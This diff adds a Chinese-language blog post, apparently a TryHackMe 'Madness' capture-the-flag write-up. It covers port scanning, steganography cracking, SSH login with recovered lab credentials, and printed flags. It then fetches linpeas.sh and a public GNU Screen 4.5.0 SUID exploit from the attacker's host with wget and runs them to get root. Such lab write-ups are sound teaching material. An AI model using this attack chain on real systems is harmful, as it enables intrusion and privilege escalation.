@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Madness | Ananda</title><meta name="author" content="Ananda"><meta name="copyright" content="Ananda"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="MadnessWill you be consumed by Madness? 端口扫描。只开了两个端口    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.144.152.189 22 SSH 10.144.152.189:22  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 0   2 10.144.152.189 80 HTTP h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_Madness">
+<meta property="og:url" content="https://s1ient.github.io/post/762f07c8.html">
+<meta property="og:site_name" content="Ananda">
+<meta property="og:description" content="MadnessWill you be consumed by Madness? 端口扫描。只开了两个端口    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.144.152.189 22 SSH 10.144.152.189:22  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 0   2 10.144.152.189 80 HTTP h">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-13T12:24:54.000Z">
+<meta property="article:modified_time" content="2026-05-14T07:52:41.246Z">
+<meta property="article:author" content="Ananda">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://s1ient.github.io/post/762f07c8.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_Madness',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-14 15:52:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Ananda" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Ananda"><span class="site-name">Ananda</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Madness</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-13T12:24:54.000Z" title="发表于 2026-05-13 20:24:54">2026-05-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-14T07:52:41.246Z" title="更新于 2026-05-14 15:52:41">2026-05-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"></div></div></div><article class="post-content" id="article-container"><h1 id="Madness"><a href="#Madness" class="headerlink" title="Madness"></a>Madness</h1><p>Will you be consumed by Madness?</p>
+<p>端口扫描。只开了两个端口</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>Host地址</th>
+<th>端口</th>
+<th>协议</th>
+<th>Uri地址</th>
+<th>标题</th>
+<th>Banner</th>
+<th>状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>10.144.152.189</td>
+<td>22</td>
+<td>SSH</td>
+<td>10.144.152.189:22</td>
+<td></td>
+<td><code>OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</code></td>
+<td>0</td>
+</tr>
+<tr>
+<td>2</td>
+<td>10.144.152.189</td>
+<td>80</td>
+<td>HTTP</td>
+<td><a target="_blank" rel="noopener" href="http://10.144.152.189/">http://10.144.152.189:80</a></td>
+<td>Apache2 Ubuntu Default Page: It works</td>
+<td><code>apache2-ubuntu默认页面</code>,<code>Apache2Debian默认页</code>,<code>Apache/2.4.18 (Ubuntu)</code>,<code>Apache-HTTP-Server-Ubuntu</code>,<code>Apache2 默认页</code>,<code>Apache-Web-Server</code></td>
+<td>200</td>
+</tr>
+</tbody></table>
+<p>访问网页，没什么东西</p>
+<p><img src="/../image/TryHackMe/easy/Madness/apache2.png"></p>
+<p>尝试目录扫描，也没有什么信息</p>
+<p>重新回到网页，F12 看到了一条注释，该注释在一张图片下面，且该图片在网页里面并不能正常显示，可能是损坏了</p>
+<p><img src="/../image/TryHackMe/easy/Madness/img.png"></p>
+<p>利用 wget 下载图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# wget http://10.144.152.189/thm.jpg                                                  </span><br><span class="line">--2026-05-13 20:42:09--  http://10.144.152.189/thm.jpg</span><br><span class="line">正在连接 10.144.152.189:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：22210 (22K) [image/jpeg]</span><br><span class="line">正在保存至: “thm.jpg”</span><br><span class="line"></span><br><span class="line">thm.jpg                          100%[=========================================================&gt;]  21.69K  24.4KB/s  用时 0.9s    </span><br><span class="line"></span><br><span class="line">2026-05-13 20:42:11 (24.4 KB/s) - 已保存 “thm.jpg” [22210/22210])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>把图片放到 010 editor 里面，图片后缀是 jpg，但是头文件信息确实 png</p>
+<p><img src="/../image/TryHackMe/easy/Madness/png.png"></p>
+<p>因此修改成正确的头文件。打开图片有一个隐藏目录</p>
+<p><img src="/../image/TryHackMe/easy/Madness/jpg.png"></p>
+<p>访问 th1s_1s_h1dd3n，页面很简洁，还是 F12 又有一条注释，提示 sercet 的值在 0-99 之间</p>
+<p><img src="/../image/TryHackMe/easy/Madness/hidden.png" alt="th1s_1s_h1dd3n"></p>
+<p>用 burpsuite 爆破，得到一个密码 y2RPJ4QaPF!B</p>
+<p><img src="/../image/TryHackMe/easy/Madness/73.png" alt="73"></p>
+<p>用得到的密码来对 thm.jpg  进行隐写分析，发现里面有一个文件，将文件分离出来</p>
+<p>查看 hidden.txt 得到用户名 wbxre</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# steghide info thm.jpg       </span><br><span class="line">&quot;thm.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 1.0 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase: </span><br><span class="line">  embedded file &quot;hidden.txt&quot;:</span><br><span class="line">    size: 101.0 Byte</span><br><span class="line">    encrypted: rijndael-128, cbc</span><br><span class="line">    compressed: yes</span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# steghide --extract -sf thm.jpg                                </span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;hidden.txt&quot;.</span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# cat hidden.txt                                                                                                            </span><br><span class="line">Fine you found the password! </span><br><span class="line"></span><br><span class="line">Here&#x27;s a username </span><br><span class="line"></span><br><span class="line">wbxre</span><br><span class="line"></span><br><span class="line">I didn&#x27;t say I would make it easy for you!</span><br></pre></td></tr></table></figure>
+
+<p>我一开始用这个用户名和密码登录 ssh，但是不行，然后就卡住了</p>
+<p>最后看 wp 才发现在题目页面给的那张图片也可以进行隐写？？？？？只能说逆天</p>
+<p><img src="/../image/TryHackMe/easy/Madness/another_img.png"></p>
+<p>同样使用 steghide 进行分析，而且不需要密码</p>
+<p>得到一个新的密码 *axA&amp;GF8dP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# steghide info 5iW7kC8.jpg     </span><br><span class="line">&quot;5iW7kC8.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 6.6 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase: </span><br><span class="line">  embedded file &quot;password.txt&quot;:</span><br><span class="line">    size: 83.0 Byte</span><br><span class="line">    encrypted: rijndael-128, cbc</span><br><span class="line">    compressed: yes</span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# steghide --extract -sf 5iW7kC8.jpg </span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;password.txt&quot;.</span><br><span class="line">                                                                                                                                   </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# cat password.txt </span><br><span class="line">I didn&#x27;t think you&#x27;d find me! Congratulations!</span><br><span class="line"></span><br><span class="line">Here take my password</span><br><span class="line"></span><br><span class="line">*axA&amp;GF8dP</span><br></pre></td></tr></table></figure>
+
+<p>这里再次尝试登录 ssh ，结果怎么死活都登不上去，只好有看一下 wp ，结果告诉我需要前面那个用户名进行 rot13 解码，解码结果为 joker……逆天</p>
+<p>好吧，用 joker 和 *axA&amp;GF8dP 总算是登进去了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# ssh joker@10.144.152.189          </span><br><span class="line">joker@10.144.152.189&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128</span><br><span class="line">joker@ubuntu:~$ id</span><br><span class="line">uid=1000(joker) gid=1000(joker) groups=1000(joker)</span><br></pre></td></tr></table></figure>
+
+<p>得到第一个 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:~$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 3 joker joker 4096 May 13 06:13 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..</span><br><span class="line">-rw------- 1 joker joker    0 Jan  5  2020 .bash_history</span><br><span class="line">-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc</span><br><span class="line">drwx------ 2 joker joker 4096 May 13 06:13 .cache</span><br><span class="line">-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt</span><br><span class="line">joker@ubuntu:~$ cat user.txt</span><br><span class="line">THM&#123;d5781e53b130efe2f94f9b0354a5e4ea&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用 wget 下载本地的 linpeas.sh，赋予权限并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:~$ wget 192.168.140.133:2518/linpeas.sh</span><br><span class="line">--2026-05-13 06:16:23--  http://192.168.140.133:2518/linpeas.sh</span><br><span class="line">Connecting to 192.168.140.133:2518... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1053413 (1.0M) [application/x-sh]</span><br><span class="line">Saving to: ‘linpeas.sh’</span><br><span class="line"></span><br><span class="line">linpeas.sh                       100%[=========================================================&gt;]   1.00M   537KB/s    in 1.9s    </span><br><span class="line"></span><br><span class="line">2026-05-13 06:16:29 (537 KB/s) - ‘linpeas.sh’ saved [1053413/1053413]</span><br><span class="line"></span><br><span class="line">joker@ubuntu:~$ chmod +x linpeas.sh </span><br><span class="line">joker@ubuntu:~$ ./linpeas.sh </span><br></pre></td></tr></table></figure>
+
+<p>把结果交给 ai 分析</p>
+<p>Screen 4.5.0 版本存在一个著名的漏洞（CVE-2017-5618），当配合 SUID 位时，可以用来读取任意文件或提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                    </span><br><span class="line">-rwsr-xr-x 1 root root 1.6M Jan  4  2020 /bin/screen-4.5.0 (Unknown SUID binary!)</span><br><span class="line">-rwsr-xr-x 1 root root 1.6M Jan  4  2020 /bin/screen-4.5.0.old (Unknown SUID binary!)</span><br></pre></td></tr></table></figure>
+
+<p>searchsploit 搜索相关漏洞，并将 41154.sh 复制下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# searchsploit  screen 4.5.0</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                   |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation                                                    | linux/local/41154.sh</span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                              | linux/local/41152.txt</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# cp /usr/share/exploitdb/exploits/linux/local/41154.sh exp.sh </span><br></pre></td></tr></table></figure>
+
+<p>再次利用 wget 将本地 exp.sh 上传并赋予权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:/tmp$ wget 192.168.140.133:2518/exp.sh</span><br><span class="line">--2026-05-13 06:57:27--  http://192.168.140.133:2518/exp.sh</span><br><span class="line">Connecting to 192.168.140.133:2518... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1149 (1.1K) [application/x-sh]</span><br><span class="line">Saving to: ‘exp.sh’</span><br><span class="line"></span><br><span class="line">exp.sh                           100%[=========================================================&gt;]   1.12K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2026-05-13 06:57:29 (2.87 MB/s) - ‘exp.sh’ saved [1149/1149]</span><br><span class="line"></span><br><span class="line">joker@ubuntu:/tmp$ chmod +x exp.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行后直接得到 root 权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:/tmp$ ./exp.sh</span><br><span class="line">~ gnu/screenroot ~</span><br><span class="line">[+] First, we create our shell and library...</span><br><span class="line">/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br><span class="line">[+] Now we create our /etc/ld.so.preload file...</span><br><span class="line">[+] Triggering...</span><br><span class="line">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">[+] done!</span><br><span class="line">There is a screen on:</span><br><span class="line">        17252.pts-0.ubuntu      (Detached)</span><br><span class="line">1 Socket in /tmp/screens/S-joker.</span><br><span class="line"># id  </span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1000(joker)</span><br><span class="line"># cat /root/root.txt</span><br><span class="line">THM&#123;5ecd98aa66a6abb670184d7547c8124a&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://s1ient.github.io">Ananda</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://s1ient.github.io/post/762f07c8.html">https://s1ient.github.io/post/762f07c8.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://s1ient.github.io" target="_blank">Ananda</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/b77ad967.html" title="TryHackMe_Thompson"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Thompson</div></div></a></div><div class="next-post pull-right"><a href="/post/cbbda74.html" title="TryHackMe_Tony the Tiger"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Tony the Tiger</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/a72569f1.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/b77ad967.html" title="TryHackMe_Thompson"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Thompson</div></div></a></div><div><a href="/post/3401368e.html" title="TryHackMe_Buleprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Buleprint</div></div></a></div><div><a href="/post/6c602f0e.html" title="TryHackMe_Creative"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Creative</div></div></a></div><div><a href="/post/381630bb.html" title="TryHackMe_VulnNet:Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_VulnNet:Internal</div></div></a></div><div><a href="/post/6sfd5316.html" title="TryHackMe_Library"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-11</div><div class="title">TryHackMe_Library</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023/03/25 - 2026 By Ananda</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas 